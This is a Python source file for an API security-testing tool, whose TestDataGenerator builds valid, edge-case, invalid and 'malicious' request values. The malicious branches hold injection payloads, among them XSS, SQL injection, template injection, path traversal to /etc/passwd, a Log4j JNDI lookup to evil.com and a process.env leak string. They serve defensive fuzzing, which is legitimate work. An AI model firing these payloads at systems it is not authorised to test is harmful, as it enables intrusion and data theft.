"""Intelligent test data generation for API security testing."""

import random
import string
import json
import re
from typing import Dict, List, Any, Optional, Union
from datetime import datetime, timedelta
from uuid import uuid4
from faker import Faker

from parser.models import APISpecification, APIEndpoint
from utils.config import settings


class TestDataGenerator:
    """Generates realistic test data for API endpoints."""
    
    def __init__(self, locale: str = 'en_US'):
        self.faker = Faker(locale)
        self.faker.add_provider(self._custom_api_provider)
        
        # Common field patterns and their generators
        self.field_patterns = {
            # Identity patterns
            r'.*id$': self._generate_id,
            r'.*_id$': self._generate_id,
            r'.*uuid$': self._generate_uuid,
            r'.*guid$': self._generate_uuid,
            
            # Name patterns
            r'.*name$': self._generate_name,
            r'.*title$': self._generate_title,
            r'.*label$': self._generate_label,
            
            # Contact patterns
            r'.*email$': self._generate_email,
            r'.*phone$': self._generate_phone,
            r'.*address$': self._generate_address,
            
            # Time patterns
            r'.*date$': self._generate_date,
            r'.*time$': self._generate_datetime,
            r'.*timestamp$': self._generate_timestamp,
            r'.*created.*': self._generate_past_datetime,
            r'.*updated.*': self._generate_recent_datetime,
            
            # Numeric patterns
            r'.*price$': self._generate_price,
            r'.*amount$': self._generate_amount,
            r'.*count$': self._generate_count,
            r'.*quantity$': self._generate_quantity,
            
            # Status patterns
            r'.*status$': self._generate_status,
            r'.*state$': self._generate_state,
            
            # Security patterns
            r'.*password$': self._generate_password,
            r'.*token$': self._generate_token,
            r'.*key$': self._generate_api_key,
            r'.*secret$': self._generate_secret,
            
            # URL patterns
            r'.*url$': self._generate_url,
            r'.*uri$': self._generate_uri,
            r'.*endpoint$': self._generate_endpoint,
        }
        
        # Common enum values for status fields
        self.status_values = {
            'status': ['active', 'inactive', 'pending', 'completed', 'cancelled'],
            'state': ['new', 'processing', 'done', 'error'],
            'priority': ['low', 'medium', 'high', 'critical'],
            'type': ['user', 'admin', 'guest'],
            'role': ['user', 'moderator', 'admin', 'superuser'],
            'category': ['general', 'important', 'urgent'],
        }
    
    def generate_endpoint_data(self, endpoint: APIEndpoint, 
                             data_type: str = "valid") -> Dict[str, Any]:
        """Generate test data for a specific endpoint."""
        
        data = {}
        
        # Generate path parameters
        path_params = self.extract_path_parameters(endpoint)
        for param_name in path_params:
            data[param_name] = self._generate_field_value(param_name, 'string', data_type)
        
        # Generate query parameters
        for param in endpoint.parameters:
            if param.get('in') == 'query':
                param_name = param.get('name')
                param_type = param.get('type', 'string')
                param_required = param.get('required', False)
                
                if param_required or data_type == "complete":
                    data[param_name] = self._generate_field_value(param_name, param_type, data_type)
        
        # Generate request body for POST/PUT/PATCH
        if endpoint.method.upper() in ['POST', 'PUT', 'PATCH']:
            body_data = self._generate_request_body(endpoint, data_type)
            if body_data:
                data['body'] = body_data
        
        return data
    
    def generate_test_dataset(self, spec: APISpecification, 
                            dataset_size: int = 100) -> Dict[str, List[Dict]]:
        """Generate a complete test dataset for an API specification."""
        
        dataset = {}
        
        for endpoint in spec.endpoints:
            endpoint_key = f"{endpoint.method}_{endpoint.path.replace('/', '_')}"
            dataset[endpoint_key] = []
            
            # Generate various types of test data
            types_to_generate = min(dataset_size, 10)  # Limit per endpoint
            
            for i in range(types_to_generate):
                if i % 4 == 0:
                    data_type = "valid"
                elif i % 4 == 1:
                    data_type = "edge_case"
                elif i % 4 == 2:
                    data_type = "invalid"
                else:
                    data_type = "malicious"
                
                test_data = self.generate_endpoint_data(endpoint, data_type)
                test_data['_metadata'] = {
                    'type': data_type,
                    'endpoint': endpoint.path,
                    'method': endpoint.method,
                    'generated_at': datetime.utcnow().isoformat()
                }
                
                dataset[endpoint_key].append(test_data)
        
        return dataset
    
    def _generate_request_body(self, endpoint: APIEndpoint, data_type: str) -> Optional[Dict]:
        """Generate request body data based on endpoint analysis."""
        
        # Try to infer request body structure from endpoint path and method
        path = endpoint.path.lower()
        method = endpoint.method.upper()
        
        # Common REST patterns
        if 'user' in path:
            return self._generate_user_data(data_type)
        elif 'product' in path:
            return self._generate_product_data(data_type)
        elif 'order' in path:
            return self._generate_order_data(data_type)
        elif 'auth' in path or 'login' in path:
            return self._generate_auth_data(data_type)
        elif 'profile' in path:
            return self._generate_profile_data(data_type)
        else:
            # Generic object based on common patterns
            return self._generate_generic_object(data_type)
    
    def _generate_user_data(self, data_type: str) -> Dict[str, Any]:
        """Generate user-related test data."""
        
        base_data = {
            'username': self.faker.user_name(),
            'email': self.faker.email(),
            'first_name': self.faker.first_name(),
            'last_name': self.faker.last_name(),
            'age': self.faker.random_int(min=18, max=80),
            'phone': self.faker.phone_number(),
        }
        
        if data_type == "edge_case":
            base_data.update({
                'username': self._generate_edge_case_string(),
                'email': self._generate_edge_case_email(),
                'age': self.faker.random_element([0, 150, -1])
            })
        
        elif data_type == "invalid":
            base_data.update({
                'email': 'invalid_email',
                'age': 'not_a_number',
                'phone': '123'
            })
        
        elif data_type == "malicious":
            base_data.update({
                'username': "<script>alert('xss')</script>",
                'email': "'; DROP TABLE users; --",
                'first_name': "{{7*7}}",
                'bio': "javascript:alert('xss')"
            })
        
        return base_data
    
    def _generate_product_data(self, data_type: str) -> Dict[str, Any]:
        """Generate product-related test data."""
        
        base_data = {
            'name': self.faker.catch_phrase(),
            'description': self.faker.text(max_nb_chars=200),
            'price': round(self.faker.random.uniform(1.0, 1000.0), 2),
            'category': self.faker.word(),
            'sku': self.faker.lexify(text="???-####"),
            'in_stock': self.faker.boolean()
        }
        
        if data_type == "edge_case":
            base_data.update({
                'name': 'A' * 255,  # Long name
                'price': 0.01,  # Minimal price
                'description': ''  # Empty description
            })
        
        elif data_type == "invalid":
            base_data.update({
                'price': -10,  # Negative price
                'in_stock': 'maybe'  # Invalid boolean
            })
        
        elif data_type == "malicious":
            base_data.update({
                'name': "<img src=x onerror=alert('xss')>",
                'description': "'; DELETE FROM products; --",
                'category': "../../../etc/passwd"
            })
        
        return base_data
    
    def _generate_order_data(self, data_type: str) -> Dict[str, Any]:
        """Generate order-related test data."""
        
        items = []
        for _ in range(self.faker.random_int(min=1, max=5)):
            items.append({
                'product_id': self.faker.random_int(min=1, max=1000),
                'quantity': self.faker.random_int(min=1, max=10),
                'price': round(self.faker.random.uniform(1.0, 100.0), 2)
            })
        
        base_data = {
            'customer_id': self.faker.random_int(min=1, max=10000),
            'items': items,
            'shipping_address': {
                'street': self.faker.street_address(),
                'city': self.faker.city(),
                'state': self.faker.state(),
                'zip_code': self.faker.zipcode()
            },
            'payment_method': self.faker.random_element(['credit_card', 'paypal', 'bank_transfer'])
        }
        
        if data_type == "edge_case":
            base_data.update({
                'items': [],  # Empty order
                'customer_id': 0  # Edge case ID
            })
        
        elif data_type == "invalid":
            base_data.update({
                'customer_id': 'invalid',
                'items': 'not_an_array'
            })
        
        elif data_type == "malicious":
            base_data.update({
                'customer_id': "1 OR 1=1",
                'shipping_address': {
                    'street': "<script>alert('xss')</script>"
                }
            })
        
        return base_data
    
    def _generate_auth_data(self, data_type: str) -> Dict[str, Any]:
        """Generate authentication-related test data."""
        
        base_data = {
            'username': self.faker.user_name(),
            'password': self.faker.password(length=12)
        }
        
        if data_type == "edge_case":
            base_data.update({
                'password': 'a',  # Too short
                'username': 'a' * 100  # Too long
            })
        
        elif data_type == "invalid":
            base_data.update({
                'username': '',  # Empty username
                'password': ''   # Empty password
            })
        
        elif data_type == "malicious":
            base_data.update({
                'username': "admin'; DROP TABLE users; --",
                'password': "' OR '1'='1"
            })
        
        return base_data
    
    def _generate_profile_data(self, data_type: str) -> Dict[str, Any]:
        """Generate profile-related test data."""
        
        base_data = {
            'bio': self.faker.text(max_nb_chars=500),
            'location': self.faker.city(),
            'website': self.faker.url(),
            'birth_date': self.faker.date_of_birth().isoformat(),
            'interests': [self.faker.word() for _ in range(3)]
        }
        
        if data_type == "edge_case":
            base_data.update({
                'bio': 'A' * 2000,  # Very long bio
                'interests': []     # No interests
            })
        
        elif data_type == "malicious":
            base_data.update({
                'bio': "<script>document.cookie</script>",
                'website': "javascript:alert('xss')"
            })
        
        return base_data
    
    def _generate_generic_object(self, data_type: str) -> Dict[str, Any]:
        """Generate generic object data."""
        
        base_data = {
            'name': self.faker.word(),
            'description': self.faker.sentence(),
            'value': self.faker.random_int(min=1, max=100),
            'active': self.faker.boolean()
        }
        
        if data_type == "edge_case":
            base_data.update({
                'name': '',  # Empty name
                'value': 0   # Zero value
            })
        
        elif data_type == "malicious":
            base_data.update({
                'name': "${jndi:ldap://evil.com/a}",  # Log4j injection
                'description': "{{7*7}}"  # Template injection
            })
        
        return base_data
    
    def _generate_field_value(self, field_name: str, field_type: str, data_type: str) -> Any:
        """Generate a value for a specific field."""
        
        field_name_lower = field_name.lower()
        
        # Check if field matches any patterns
        for pattern, generator in self.field_patterns.items():
            if re.match(pattern, field_name_lower):
                return generator(data_type)
        
        # Check for common enum fields
        for enum_type, values in self.status_values.items():
            if enum_type in field_name_lower:
                if data_type == "invalid":
                    return "invalid_" + enum_type
                return self.faker.random_element(values)
        
        # Generate based on type
        return self._generate_by_type(field_type, data_type)
    
    def _generate_by_type(self, field_type: str, data_type: str) -> Any:
        """Generate value based on field type."""
        
        if data_type == "malicious":
            return self._generate_malicious_value(field_type)
        
        type_map = {
            'string': lambda: self._generate_string(data_type),
            'integer': lambda: self._generate_integer(data_type),
            'number': lambda: self._generate_number(data_type),
            'boolean': lambda: self._generate_boolean(data_type),
            'array': lambda: self._generate_array(data_type),
            'object': lambda: self._generate_object(data_type)
        }
        
        generator = type_map.get(field_type.lower(), type_map['string'])
        return generator()
    
    # Field generators
    def _generate_id(self, data_type: str) -> Union[int, str]:
        if data_type == "edge_case":
            return self.faker.random_element([0, -1, 2147483647])
        elif data_type == "invalid":
            return "not_an_id"
        elif data_type == "malicious":
            return "'; DROP TABLE users; --"
        return self.faker.random_int(min=1, max=999999)
    
    def _generate_uuid(self, data_type: str) -> str:
        if data_type == "invalid":
            return "invalid-uuid"
        elif data_type == "malicious":
            return "<script>alert('xss')</script>"
        return str(uuid4())
    
    def _generate_name(self, data_type: str) -> str:
        if data_type == "edge_case":
            return self.faker.random_element(['', 'A', 'A' * 255])
        elif data_type == "malicious":
            return "<img src=x onerror=alert('xss')>"
        return self.faker.name()
    
    def _generate_title(self, data_type: str) -> str:
        if data_type == "edge_case":
            return 'A' * 100
        elif data_type == "malicious":
            return "javascript:alert('xss')"
        return self.faker.sentence(nb_words=3)
    
    def _generate_label(self, data_type: str) -> str:
        if data_type == "malicious":
            return "{{7*7}}"  # Template injection
        return self.faker.word().title()
    
    def _generate_email(self, data_type: str) -> str:
        if data_type == "edge_case":
            return self._generate_edge_case_email()
        elif data_type == "invalid":
            return "invalid_email"
        elif data_type == "malicious":
            return "'; DROP TABLE users; --"
        return self.faker.email()
    
    def _generate_edge_case_email(self) -> str:
        """Generate edge case email addresses."""
        edge_cases = [
            'a@b.co',  # Very short
            'very.long.email.address.that.might.cause.issues@very-long-domain-name.com',  # Very long
            'test+tag@domain.com',  # With plus tag
            'user@domain',  # No TLD
            'user@[192.168.1.1]',  # IP address
        ]
        return self.faker.random_element(edge_cases)
    
    def _generate_phone(self, data_type: str) -> str:
        if data_type == "edge_case":
            return self.faker.random_element(['', '1', '123456789012345'])
        elif data_type == "invalid":
            return "not_a_phone"
        elif data_type == "malicious":
            return "<script>alert('phone')</script>"
        return self.faker.phone_number()
    
    def _generate_address(self, data_type: str) -> str:
        if data_type == "malicious":
            return "../../../etc/passwd"
        return self.faker.address()
    
    def _generate_date(self, data_type: str) -> str:
        if data_type == "edge_case":
            return "1900-01-01"
        elif data_type == "invalid":
            return "not_a_date"
        return self.faker.date().isoformat()
    
    def _generate_datetime(self, data_type: str) -> str:
        if data_type == "invalid":
            return "invalid_datetime"
        return self.faker.date_time().isoformat()
    
    def _generate_timestamp(self, data_type: str) -> int:
        if data_type == "edge_case":
            return 0  # Unix epoch
        elif data_type == "invalid":
            return -1
        return int(self.faker.date_time().timestamp())
    
    def _generate_past_datetime(self, data_type: str) -> str:
        return self.faker.date_time_between(start_date='-1y', end_date='now').isoformat()
    
    def _generate_recent_datetime(self, data_type: str) -> str:
        return self.faker.date_time_between(start_date='-30d', end_date='now').isoformat()
    
    def _generate_price(self, data_type: str) -> float:
        if data_type == "edge_case":
            return self.faker.random_element([0.01, 999999.99])
        elif data_type == "invalid":
            return -10.0
        return round(self.faker.random.uniform(0.01, 1000.0), 2)
    
    def _generate_amount(self, data_type: str) -> float:
        return self._generate_price(data_type)
    
    def _generate_count(self, data_type: str) -> int:
        if data_type == "edge_case":
            return 0
        elif data_type == "invalid":
            return -1
        return self.faker.random_int(min=1, max=1000)
    
    def _generate_quantity(self, data_type: str) -> int:
        return self._generate_count(data_type)
    
    def _generate_status(self, data_type: str) -> str:
        if data_type == "invalid":
            return "invalid_status"
        return self.faker.random_element(self.status_values['status'])
    
    def _generate_state(self, data_type: str) -> str:
        if data_type == "invalid":
            return "invalid_state"
        return self.faker.random_element(self.status_values['state'])
    
    def _generate_password(self, data_type: str) -> str:
        if data_type == "edge_case":
            return self.faker.random_element(['', 'a', 'A' * 128])
        elif data_type == "malicious":
            return "'; DROP TABLE users; --"
        return self.faker.password(length=12)
    
    def _generate_token(self, data_type: str) -> str:
        if data_type == "invalid":
            return ""
        elif data_type == "malicious":
            return "{{constructor.constructor('return process.env')()}}"
        return self.faker.sha256()[:32]
    
    def _generate_api_key(self, data_type: str) -> str:
        if data_type == "invalid":
            return "invalid_key"
        return self.faker.lexify(text="ak_" + "?" * 32)
    
    def _generate_secret(self, data_type: str) -> str:
        if data_type == "malicious":
            return "${jndi:ldap://evil.com/a}"
        return self.faker.sha256()
    
    def _generate_url(self, data_type: str) -> str:
        if data_type == "malicious":
            return "javascript:alert('xss')"
        elif data_type == "edge_case":
            return "http://localhost"
        return self.faker.url()
    
    def _generate_uri(self, data_type: str) -> str:
        return self._generate_url(data_type)
    
    def _generate_endpoint(self, data_type: str) -> str:
        if data_type == "malicious":
            return "http://evil.com/steal"
        return f"/api/{self.faker.word()}"
    
    # Type-based generators
    def _generate_string(self, data_type: str) -> str:
        if data_type == "edge_case":
            return self._generate_edge_case_string()
        elif data_type == "malicious":
            return self._generate_malicious_string()
        return self.faker.word()
    
    def _generate_edge_case_string(self) -> str:
        """Generate edge case strings."""
        edge_cases = [
            '',  # Empty string
            ' ',  # Single space
            '\n',  # Newline
            '\t',  # Tab
            'A' * 255,  # Long string
            '🚀💀',  # Unicode/Emoji
            '\\',  # Backslash
            '"',  # Quote
            "'",  # Single quote
            '<>',  # HTML-like
        ]
        return self.faker.random_element(edge_cases)
    
    def _generate_malicious_string(self) -> str:
        """Generate malicious test strings."""
        payloads = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "{{7*7}}",
            "${jndi:ldap://evil.com/a}",
            "../../../etc/passwd",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "' OR '1'='1",
            "{{constructor.constructor('return process.env')()}}",
            "%3Cscript%3Ealert('xss')%3C/script%3E"
        ]
        return self.faker.random_element(payloads)
    
    def _generate_integer(self, data_type: str) -> int:
        if data_type == "edge_case":
            return self.faker.random_element([0, -1, 2147483647, -2147483648])
        elif data_type == "malicious":
            return 2147483648  # Integer overflow
        return self.faker.random_int()
    
    def _generate_number(self, data_type: str) -> float:
        if data_type == "edge_case":
            return self.faker.random_element([0.0, -0.0, float('inf'), float('-inf')])
        return self.faker.random.uniform(-1000.0, 1000.0)
    
    def _generate_boolean(self, data_type: str) -> Union[bool, str]:
        if data_type == "invalid":
            return "not_a_boolean"
        return self.faker.boolean()
    
    def _generate_array(self, data_type: str) -> List[Any]:
        if data_type == "edge_case":
            return []  # Empty array
        return [self.faker.word() for _ in range(self.faker.random_int(min=1, max=5))]
    
    def _generate_object(self, data_type: str) -> Dict[str, Any]:
        if data_type == "edge_case":
            return {}  # Empty object
        return {
            self.faker.word(): self.faker.word()
            for _ in range(self.faker.random_int(min=1, max=3))
        }
    
    def _generate_malicious_value(self, field_type: str) -> Any:
        """Generate malicious values based on field type."""
        malicious_map = {
            'string': self._generate_malicious_string,
            'integer': lambda: 2147483648,  # Integer overflow
            'number': lambda: float('inf'),
            'boolean': lambda: "'; DROP TABLE users; --",
            'array': lambda: ["<script>alert('xss')</script>"],
            'object': lambda: {"evil": "'; DROP TABLE users; --"}
        }
        
        generator = malicious_map.get(field_type.lower(), self._generate_malicious_string)
        return generator()
    
    def extract_path_parameters(self, endpoint: APIEndpoint) -> List[str]:
        """Extract path parameter names from endpoint path."""
        import re
        pattern = r'\{([^}]+)\}'
        return re.findall(pattern, endpoint.path)
    
    @staticmethod
    def _custom_api_provider(fake):
        """Custom Faker provider for API-specific data."""
        
        def api_version():
            return f"v{fake.random_int(min=1, max=3)}"
        
        def http_status():
            return fake.random_element([200, 201, 400, 401, 403, 404, 500])
        
        def mime_type():
            return fake.random_element([
                'application/json', 'application/xml', 'text/plain',
                'text/html', 'application/pdf'
            ])
        
        fake.add_provider('api_version', api_version)
        fake.add_provider('http_status', http_status)
        fake.add_provider('mime_type', mime_type)